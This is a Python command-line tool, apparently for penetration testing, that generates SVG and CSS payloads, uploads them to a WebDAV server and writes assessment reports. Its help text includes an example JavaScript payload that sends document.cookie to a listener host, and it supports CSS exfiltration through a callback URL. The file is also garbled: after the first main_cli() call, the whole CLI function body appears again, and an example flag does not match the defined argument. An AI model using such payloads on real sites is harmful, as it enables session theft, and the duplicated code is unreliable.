import os
import json
import datetime
import logging
import traceback # For more detailed error logging if needed

# Assuming other modules are in the same directory or PYTHONPATH
from payload_generator import PayloadGenerator # Not directly used, but good for type hinting if needed
from svg_payload_generator import SVGPayloadGenerator
from css_payload_generator import CSSPayloadGenerator
from webdav_client import WebDAVClient

class WebDAVSecurityTester:
    """Main application class for WebDAV security testing."""

    def __init__(self, config):
        """
        Initialize with configuration.
        Config dictionary example:
        {
            'webdav_url': 'http://example.com/webdav',
            'username': 'user',
            'password': 'password',
            'output_dir': './payload_output', # For generated payloads
            'report_dir': './reports',       # For markdown reports
            'timeout': 10                    # Optional, for WebDAVClient
        }
        """
        self.config = config
        if not self.config.get('webdav_url'):
            raise ValueError("WebDAV URL ('webdav_url') must be provided in config.")

        # Use specific subdirectories within a general output_dir for generated payloads
        # to keep things organized if this tool's output_dir is shared.
        # The generators themselves will use what's passed in their 'output_dir' config.
        self.base_payload_output_dir = self.config.get('output_dir', './dav_security_tester_output')
        self.report_dir = self.config.get('report_dir', os.path.join(self.base_payload_output_dir, 'reports'))

        self._ensure_dir_exists(self.base_payload_output_dir)
        self._ensure_dir_exists(self.report_dir)

        self.logger = self._setup_logging()
        self.logger.info(f"WebDAVSecurityTester initialized. Outputting payloads to subdirs of: {self.base_payload_output_dir}, Reports to: {self.report_dir}")

        # Initialize components
        self.webdav_client = WebDAVClient(
            base_url=config['webdav_url'],
            username=config.get('username'),
            password=config.get('password'),
            timeout=config.get('timeout', 10) # Pass timeout to WebDAVClient
        )

        # Configure payload generators to use subdirectories of base_payload_output_dir
        svg_payload_dir = os.path.join(self.base_payload_output_dir, 'svg_payloads')
        css_payload_dir = os.path.join(self.base_payload_output_dir, 'css_payloads')

        self.svg_generator = SVGPayloadGenerator(config={'output_dir': svg_payload_dir})
        self.css_generator = CSSPayloadGenerator(config={'output_dir': css_payload_dir})

        self.results = []

    def _ensure_dir_exists(self, dir_path):
        """Helper to create a directory if it doesn't exist."""
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
            # self.logger might not be initialized when this is first called by __init__
            print(f"Info: Created directory: {dir_path}") # Use print for early messages
        elif not os.path.isdir(dir_path):
            raise OSError(f"Error: Path {dir_path} exists but is not a directory.")


    def _setup_logging(self):
        """Configure logging for the tester application."""
        logger = logging.getLogger(self.__class__.__name__)
        if not logger.handlers: # Avoid duplicate handlers
            logger.setLevel(logging.INFO)

            # File Handler for detailed logs
            log_file_path = os.path.join(self.report_dir, 'security_tester_run.log')
            file_handler = logging.FileHandler(log_file_path, encoding='utf-8')
            file_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            logger.addHandler(file_handler)

            # Console Handler for general progress
            console_handler = logging.StreamHandler()
            console_formatter = logging.Formatter('%(levelname)s: %(message)s') # Simpler format for console
            console_handler.setFormatter(console_formatter)
            # Filter console to INFO and above, file log can be DEBUG if needed later
            console_handler.setLevel(logging.INFO)
            logger.addHandler(console_handler)
        return logger

    def run_test(self, file_type, payload_name, params=None):
        """
        Run a security test with the specified payload.
        file_type (str): 'svg' or 'css'
        payload_name (str): The specific name of the payload (e.g., 'basic', 'script_tag')
        params (dict, optional): Parameters for the payload generator.
        """
        self.logger.info(f"Starting test: FileType='{file_type}', PayloadName='{payload_name}', Params='{params}'")

        local_payload_path = None
        upload_success = False
        verify_success = False # Verification by GETting the file back
        error_message = None

        try:
            # 1. Generate payload
            if file_type.lower() == 'svg':
                local_payload_path = self.svg_generator.generate(payload_name, params)
            elif file_type.lower() == 'css':
                local_payload_path = self.css_generator.generate(payload_name, params)
            else:
                raise ValueError(f"Unsupported file type for testing: {file_type}. Must be 'svg' or 'css'.")

            self.logger.info(f"Generated payload at: {local_payload_path}")

            # 2. Create remote path
            # A common strategy: /<base_test_dir>/<file_type>_<payload_name>/<original_filename>
            # This helps organize files on the server if multiple tests are run.
            filename_only = os.path.basename(local_payload_path)
            # Sanitize payload_name for directory use if it's not already filename-safe
            safe_payload_name_for_dir = payload_name.replace('_', '-').replace(' ', '-')

            # Let WebDAVClient handle leading/trailing slashes for remote_path components
            remote_test_dir = self.config.get('remote_base_dir', 'dav_security_tests').strip('/')
            remote_subdir = f"{file_type.lower()}_{safe_payload_name_for_dir}"
            remote_path = f"{remote_test_dir}/{remote_subdir}/{filename_only}"

            self.logger.info(f"Target remote path: {remote_path}")

            # 3. Upload payload
            upload_success = self.webdav_client.put_file(local_payload_path, remote_path)

            # 4. Verify by downloading (optional, but good for confirming placement)
            if upload_success:
                self.logger.info(f"Upload reported success for {remote_path}. Attempting verification GET.")
                retrieved_content = self.webdav_client.get_file(remote_path)
                if retrieved_content is not None:
                    # Compare with local file content for basic verification
                    with open(local_payload_path, 'rb') as f_local:
                        local_content = f_local.read()
                    if retrieved_content == local_content:
                        verify_success = True
                        self.logger.info(f"Verification GET successful and content matches for {remote_path}.")
                    else:
                        self.logger.warning(f"Verification GET for {remote_path} retrieved content, but it MISMATCHES local file.")
                else:
                    self.logger.warning(f"Verification GET failed for {remote_path} despite successful PUT.")
            else:
                 self.logger.warning(f"Upload failed for {remote_path}. Skipping verification GET.")

        except ValueError as ve: # Catch errors from generator or type checks
            self.logger.error(f"Configuration error for test {file_type}/{payload_name}: {ve}")
            error_message = str(ve)
        except Exception as e:
            self.logger.error(f"Unexpected error during test {file_type}/{payload_name}: {e}", exc_info=True)
            error_message = str(e)
            # traceback.print_exc() # Already logged with exc_info=True

        # Store result
        result = {
            'timestamp': datetime.datetime.now().isoformat(),
            'file_type': file_type,
            'payload_name': payload_name,
            'params_used': params,
            'local_payload_path': local_payload_path, # Path where generated payload was saved locally
            'target_remote_path': remote_path if 'remote_path' in locals() else 'N/A',
            'upload_status': 'success' if upload_success else 'failed',
            'verification_status': 'success' if verify_success else 'failed' if upload_success else 'skipped',
            'error_message': error_message
        }
        self.results.append(result)

        if error_message:
             self.logger.info(f"Test '{file_type}/{payload_name}' completed with error: {error_message}")
        else:
             self.logger.info(f"Test '{file_type}/{payload_name}' completed. Upload: {result['upload_status']}, Verification: {result['verification_status']}")
        return result

    def run_batch_tests(self, test_configs_list):
        """
        Run multiple tests based on a list of configuration dictionaries.
        Each dict in test_configs_list should have 'file_type', 'payload_name',
        and optionally 'params'.
        """
        self.logger.info(f"Starting batch of {len(test_configs_list)} tests.")
        batch_results = []
        for i, test_config in enumerate(test_configs_list):
            self.logger.info(f"Running batch test {i+1}/{len(test_configs_list)}: {test_config}")
            file_type = test_config.get('file_type')
            payload_name = test_config.get('payload_name')
            params = test_config.get('params')

            if not file_type or not payload_name:
                self.logger.error(f"Skipping invalid test config in batch (missing file_type or payload_name): {test_config}")
                error_result = {
                    'timestamp': datetime.datetime.now().isoformat(),
                    'error_message': 'Invalid test config in batch (missing file_type or payload_name)',
                    'original_config': test_config
                }
                batch_results.append(error_result)
                self.results.append(error_result) # Also add to main results for reporting
                continue

            result = self.run_test(file_type, payload_name, params)
            batch_results.append(result)
        self.logger.info("Batch testing completed.")
        return batch_results # Returns results for this batch only

    def generate_report(self, report_format="md"):
        """Generate a comprehensive test report."""
        if not self.results:
            self.logger.warning("No test results available to generate a report.")
            return None

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        # Sanitize webdav_url for use in filename
        safe_target_name = self.config['webdav_url'].replace('http://','').replace('https://','').replace('/','_').replace(':','-')
        report_filename = f"webdav_security_report_{safe_target_name}_{timestamp}.{report_format}"
        report_path = os.path.join(self.report_dir, report_filename)

        report_content = ""
        if report_format == "md":
            report_content = self._format_markdown_report()
        elif report_format == "json":
            report_content = json.dumps({
                "report_info": {
                    "target_url": self.config['webdav_url'],
                    "generation_time": datetime.datetime.now().isoformat(),
                    "total_tests": len(self.results)
                },
                "test_results": self.results
            }, indent=2)
        else:
            self.logger.error(f"Unsupported report format: {report_format}")
            return None

        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(report_content)
            self.logger.info(f"Report successfully generated: {report_path}")
            return report_path
        except IOError as e:
            self.logger.error(f"Failed to write report to {report_path}: {e}")
            return None

    def _format_markdown_report(self):
        """Format test results as a Markdown report."""
        report_lines = [
            f"# WebDAV Security Assessment Report",
            f"- **Target URL**: {self.config['webdav_url']}",
            f"- **Report Date**: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"- **Total Tests Run**: {len(self.results)}\n",
            f"## Summary of Test Outcomes",
            f"- Successful Uploads: {sum(1 for r in self.results if r.get('upload_status') == 'success')}",
            f"- Successful Verifications (GET after PUT): {sum(1 for r in self.results if r.get('verification_status') == 'success')}",
            f"- Tests with Errors: {sum(1 for r in self.results if r.get('error_message') is not None)}\n",
            f"## Detailed Test Results"
        ]

        if not self.results:
            report_lines.append("\nNo tests were run or no results recorded.\n")

        for i, result in enumerate(self.results, 1):
            report_lines.append(f"\n### Test {i}: {result.get('file_type','N/A')}/{result.get('payload_name','N/A')}")
            report_lines.append(f"- Timestamp: {result.get('timestamp', 'N/A')}")
            report_lines.append(f"- Parameters Used: `{json.dumps(result.get('params_used')) if result.get('params_used') else 'None'}`")
            report_lines.append(f"- Local Payload Path: `{result.get('local_payload_path', 'N/A')}`")
            report_lines.append(f"- Target Remote Path: `{result.get('target_remote_path', 'N/A')}`")
            report_lines.append(f"- Upload Status: **{result.get('upload_status', 'N/A').upper()}**")
            report_lines.append(f"- Verification Status (Content Match): **{result.get('verification_status', 'N/A').upper()}**")
            if result.get('error_message'):
                report_lines.append(f"- **Error Message**: `{result.get('error_message')}`")

        report_lines.append("\n## General Security Recommendations")
        recommendations = self._generate_recommendations()
        for rec in recommendations:
            report_lines.append(f"- {rec}")

        return "\n".join(report_lines)

    def _generate_recommendations(self):
        """Generate security recommendations based on test results (can be expanded)."""
        recommendations = [
            "Ensure WebDAV servers are patched and up-to-date.",
            "Implement strict authentication and authorization controls for WebDAV access.",
            "If anonymous write access is enabled, carefully monitor uploaded content and restrict executable file types.",
            "Configure Content Security Policy (CSP) headers on any web applications that might serve or reference content from this WebDAV server, especially for SVG and HTML-like content.",
            "Use `X-Content-Type-Options: nosniff` header to prevent browsers from MIME-sniffing responses.",
            "For files like SVG and CSS, if they are user-supplied, consider server-side sanitization or serving them with a restrictive Content-Type (e.g., `text/plain`) if their active content is not required.",
            "Regularly audit WebDAV directories for unauthorized or suspicious files."
        ]
        # Example of context-specific recommendation (can be much more detailed)
        if any("svg" in r.get('file_type', '') and r.get('upload_status') == 'success' for r in self.results):
            recommendations.append("SVG file uploads were successful. Be aware that SVGs can contain JavaScript. If these are user-controlled uploads, ensure they are sanitized or served with appropriate security headers (like CSP) if rendered by browsers.")
        if any("css" in r.get('file_type', '') and "exfil" in r.get('payload_name', '') and r.get('upload_status') == 'success' for r in self.results):
            recommendations.append("CSS exfiltration payloads were uploaded. While CSS execution is limited, data leakage via CSS is possible. Review how CSS files are served and if they can access sensitive information in the DOM or via attributes.")

        return recommendations

# --- CLI Implementation ---
import argparse
import textwrap # For formatting help text
import sys # Required for sys.exit calls in main_cli

def main_cli():
    """Main entry point for the WebDAV security testing tool's CLI."""
    parser = argparse.ArgumentParser(
        description='Enhanced WebDAV Security Assessment Tool with SVG/CSS Payload Capabilities.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
        Examples:
          # Run a basic SVG test
          python security_tester.py --url http://localhost:8080 --test svg/basic

          # Run a CSS exfiltration test with a callback URL
          python security_tester.py --url http://localhost:8080 --test css/background_exfil --callback http://my.listener.com/log

          # Run an SVG script_tag test with custom JavaScript
          python security_tester.py --url http://localhost:8080 --test svg/script_tag --js-code "fetch('http://my.listener.com/?c='+document.cookie)"

          # List all available tests
          python security_tester.py --url http://localhost:8080 --list-tests

          # Run tests from a batch JSON file
          python security_tester.py --url http://localhost:8080 --batch tests_to_run.json
                                    --username webdav_user --password webdav_pass
        ''')
    )

    # Server Connection Arguments
    parser.add_argument('--url', required=True, help='Target WebDAV server URL (e.g., http://localhost:8080/webdav)')
    parser.add_argument('--username', help='WebDAV username for authentication')
    parser.add_argument('--password', help='WebDAV password for authentication')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')

    # Test Execution Group (mutually exclusive: either one test, list tests, or batch)
    test_execution_group = parser.add_mutually_exclusive_group(required=True)
    test_execution_group.add_argument(
        '--test',
        help='Specify a single test to run in format: filetype/payloadname (e.g., svg/basic, css/background_exfil)'
    )
    test_execution_group.add_argument(
        '--list-tests',
        action='store_true',
        help='List all available payload types for SVG and CSS generators.'
    )
    test_execution_group.add_argument(
        '--batch',
        metavar='BATCH_FILE.JSON',
        help='Path to a JSON file containing batch test configurations. See documentation for format.'
    )

    # Payload Specific Parameters (optional)
    parser.add_argument('--js-code', help='JavaScript code to embed in relevant SVG payloads (e.g., script_tag, event_handler).')
    parser.add_argument('--callback-url', help='Callback URL for exfiltration payloads (e.g., for CSS background_exfil or SVG data_exfil).')
    # Add more specific params here if needed, e.g., for CSS target_element, etc.
    # For now, these common ones are included. Others can be passed via batch JSON params.

    # Output & Reporting Configuration
    parser.add_argument('--output-dir', default='./dav_security_output', help='Base directory to store generated payloads and logs (default: ./dav_security_output)')
    parser.add_argument('--report-dir', help='Directory to store reports (defaults to a "reports" subdir within --output-dir).')
    parser.add_argument('--report-formats', nargs='+', default=['md', 'json'], choices=['md', 'json'], help='Format(s) for the report (default: md json).')
    parser.add_argument('--remote-base-dir', default='dav_security_tests', help='Base directory on the WebDAV server for placing test files (default: dav_security_tests)')


    args = parser.parse_args()

    # --- Initialize Configuration from Args ---
    config = {
        'webdav_url': args.url,
        'username': args.username,
        'password': args.password,
        'timeout': args.timeout,
        'output_dir': args.output_dir, # Base output for tester, it will create subdirs
        'report_dir': args.report_dir if args.report_dir else os.path.join(args.output_dir, 'reports'),
        'remote_base_dir': args.remote_base_dir
    }

    try:
        tester = WebDAVSecurityTester(config)
    except ValueError as ve: # Catch config errors from tester init
        print(f"Configuration Error: {ve}")
        parser.print_help()
        sys.exit(1)
    except OSError as oe: # Catch directory creation errors
        print(f"File System Error: {oe}")
        sys.exit(1)


    # --- Execute Action Based on Args ---
    if args.list_tests:
        print("Available SVG Payloads:")
        for pt in tester.svg_generator.get_available_payloads():
            print(f"  svg/{pt}")
        print("\nAvailable CSS Payloads:")
        for pt in tester.css_generator.get_available_payloads():
            print(f"  css/{pt}")
        sys.exit(0)

    # Prepare parameters for single test or for tests within batch if not overridden
    # These CLI params act as defaults/overrides for params in batch file if not specified there.
    # However, the current run_batch_tests expects params within each test_config.
    # For single --test, these are the primary params.
    single_test_params = {}
    if args.js_code:
        single_test_params['js_code'] = args.js_code
    if args.callback_url:
        single_test_params['callback_url'] = args.callback_url
    # Add more here if other CLI flags for params are added

    if args.test:
        try:
            file_type, payload_name = args.test.split('/', 1)
            if not file_type or not payload_name: raise ValueError("Invalid format")
            tester.run_test(file_type, payload_name, params=single_test_params)
        except ValueError:
            print(f"Invalid --test format: '{args.test}'. Use 'filetype/payloadname' (e.g., svg/basic).")
            print("Use --list-tests to see available types.")
            sys.exit(1)

    elif args.batch:
        if not os.path.exists(args.batch):
            print(f"Error: Batch file not found: {args.batch}")
            sys.exit(1)
        try:
            with open(args.batch, 'r', encoding='utf-8') as f:
                batch_configs_json = json.load(f)

            # The plan example had {"tests": [...]}, so adapt if that's the expected structure
            if isinstance(batch_configs_json, dict) and "tests" in batch_configs_json:
                test_configs_list = batch_configs_json["tests"]
            elif isinstance(batch_configs_json, list): # Or a direct list of test configs
                test_configs_list = batch_configs_json
            else:
                raise ValueError("Batch JSON must be a list of test configurations or a dict with a 'tests' key.")

            tester.run_batch_tests(test_configs_list)
        except json.JSONDecodeError as je:
            print(f"Error decoding batch JSON file '{args.batch}': {je}")
            sys.exit(1)
        except ValueError as ve: # For our custom ValueError from structure check
             print(f"Error in batch file structure '{args.batch}': {ve}")
             sys.exit(1)
        except Exception as e:
            print(f"An unexpected error occurred while processing batch file '{args.batch}': {e}")
            traceback.print_exc()
            sys.exit(1)

    # --- Generate Report(s) ---
    if tester.results: # Only generate reports if some tests were attempted
        for report_format in args.report_formats:
            report_path = tester.generate_report(report_format=report_format)
            if report_path:
                print(f"{report_format.upper()} report generated: {report_path}")
            else:
                print(f"Failed to generate {report_format.upper()} report.")
    else:
        print("No tests were run, so no report generated.")

    print("\nWebDAV Security Tester finished.")

if __name__ == '__main__':
    # The example usage from WebDAVSecurityTester class is removed as CLI is now primary.
    # import sys # Required for sys.exit calls in main_cli # Already imported above
    main_cli()
    """Main entry point for the WebDAV security testing tool's CLI."""
    parser = argparse.ArgumentParser(
        description='Enhanced WebDAV Security Assessment Tool with SVG/CSS Payload Capabilities.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
        Examples:
          # Run a basic SVG test
          python security_tester.py --url http://localhost:8080 --test svg/basic

          # Run a CSS exfiltration test with a callback URL
          python security_tester.py --url http://localhost:8080 --test css/background_exfil --callback http://my.listener.com/log

          # Run an SVG script_tag test with custom JavaScript
          python security_tester.py --url http://localhost:8080 --test svg/script_tag --js-code "fetch('http://my.listener.com/?c='+document.cookie)"

          # List all available tests
          python security_tester.py --url http://localhost:8080 --list-tests

          # Run tests from a batch JSON file
          python security_tester.py --url http://localhost:8080 --batch tests_to_run.json
                                    --username webdav_user --password webdav_pass
        ''')
    )

    # Server Connection Arguments
    parser.add_argument('--url', required=True, help='Target WebDAV server URL (e.g., http://localhost:8080/webdav)')
    parser.add_argument('--username', help='WebDAV username for authentication')
    parser.add_argument('--password', help='WebDAV password for authentication')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')

    # Test Execution Group (mutually exclusive: either one test, list tests, or batch)
    test_execution_group = parser.add_mutually_exclusive_group(required=True)
    test_execution_group.add_argument(
        '--test',
        help='Specify a single test to run in format: filetype/payloadname (e.g., svg/basic, css/background_exfil)'
    )
    test_execution_group.add_argument(
        '--list-tests',
        action='store_true',
        help='List all available payload types for SVG and CSS generators.'
    )
    test_execution_group.add_argument(
        '--batch',
        metavar='BATCH_FILE.JSON',
        help='Path to a JSON file containing batch test configurations. See documentation for format.'
    )

    # Payload Specific Parameters (optional)
    parser.add_argument('--js-code', help='JavaScript code to embed in relevant SVG payloads (e.g., script_tag, event_handler).')
    parser.add_argument('--callback-url', help='Callback URL for exfiltration payloads (e.g., for CSS background_exfil or SVG data_exfil).')
    # Add more specific params here if needed, e.g., for CSS target_element, etc.
    # For now, these common ones are included. Others can be passed via batch JSON params.

    # Output & Reporting Configuration
    parser.add_argument('--output-dir', default='./dav_security_output', help='Base directory to store generated payloads and logs (default: ./dav_security_output)')
    parser.add_argument('--report-dir', help='Directory to store reports (defaults to a "reports" subdir within --output-dir).')
    parser.add_argument('--report-formats', nargs='+', default=['md', 'json'], choices=['md', 'json'], help='Format(s) for the report (default: md json).')
    parser.add_argument('--remote-base-dir', default='dav_security_tests', help='Base directory on the WebDAV server for placing test files (default: dav_security_tests)')


    args = parser.parse_args()

    # --- Initialize Configuration from Args ---
    config = {
        'webdav_url': args.url,
        'username': args.username,
        'password': args.password,
        'timeout': args.timeout,
        'output_dir': args.output_dir, # Base output for tester, it will create subdirs
        'report_dir': args.report_dir if args.report_dir else os.path.join(args.output_dir, 'reports'),
        'remote_base_dir': args.remote_base_dir
    }

    try:
        tester = WebDAVSecurityTester(config)
    except ValueError as ve: # Catch config errors from tester init
        print(f"Configuration Error: {ve}")
        parser.print_help()
        sys.exit(1)
    except OSError as oe: # Catch directory creation errors
        print(f"File System Error: {oe}")
        sys.exit(1)


    # --- Execute Action Based on Args ---
    if args.list_tests:
        print("Available SVG Payloads:")
        for pt in tester.svg_generator.get_available_payloads():
            print(f"  svg/{pt}")
        print("\nAvailable CSS Payloads:")
        for pt in tester.css_generator.get_available_payloads():
            print(f"  css/{pt}")
        sys.exit(0)

    # Prepare parameters for single test or for tests within batch if not overridden
    # These CLI params act as defaults/overrides for params in batch file if not specified there.
    # However, the current run_batch_tests expects params within each test_config.
    # For single --test, these are the primary params.
    single_test_params = {}
    if args.js_code:
        single_test_params['js_code'] = args.js_code
    if args.callback_url:
        single_test_params['callback_url'] = args.callback_url
    # Add more here if other CLI flags for params are added

    if args.test:
        try:
            file_type, payload_name = args.test.split('/', 1)
            if not file_type or not payload_name: raise ValueError("Invalid format")
            tester.run_test(file_type, payload_name, params=single_test_params)
        except ValueError:
            print(f"Invalid --test format: '{args.test}'. Use 'filetype/payloadname' (e.g., svg/basic).")
            print("Use --list-tests to see available types.")
            sys.exit(1)

    elif args.batch:
        if not os.path.exists(args.batch):
            print(f"Error: Batch file not found: {args.batch}")
            sys.exit(1)
        try:
            with open(args.batch, 'r', encoding='utf-8') as f:
                batch_configs_json = json.load(f)

            # The plan example had {"tests": [...]}, so adapt if that's the expected structure
            if isinstance(batch_configs_json, dict) and "tests" in batch_configs_json:
                test_configs_list = batch_configs_json["tests"]
            elif isinstance(batch_configs_json, list): # Or a direct list of test configs
                test_configs_list = batch_configs_json
            else:
                raise ValueError("Batch JSON must be a list of test configurations or a dict with a 'tests' key.")

            tester.run_batch_tests(test_configs_list)
        except json.JSONDecodeError as je:
            print(f"Error decoding batch JSON file '{args.batch}': {je}")
            sys.exit(1)
        except ValueError as ve: # For our custom ValueError from structure check
             print(f"Error in batch file structure '{args.batch}': {ve}")
             sys.exit(1)
        except Exception as e:
            print(f"An unexpected error occurred while processing batch file '{args.batch}': {e}")
            traceback.print_exc()
            sys.exit(1)

    # --- Generate Report(s) ---
    if tester.results: # Only generate reports if some tests were attempted
        for report_format in args.report_formats:
            report_path = tester.generate_report(report_format=report_format)
            if report_path:
                print(f"{report_format.upper()} report generated: {report_path}")
            else:
                print(f"Failed to generate {report_format.upper()} report.")
    else:
        print("No tests were run, so no report generated.")

    print("\nWebDAV Security Tester finished.")

if __name__ == '__main__':
    # The example usage from WebDAVSecurityTester class is removed as CLI is now primary.
    import sys # Required for sys.exit calls in main_cli
    main_cli()
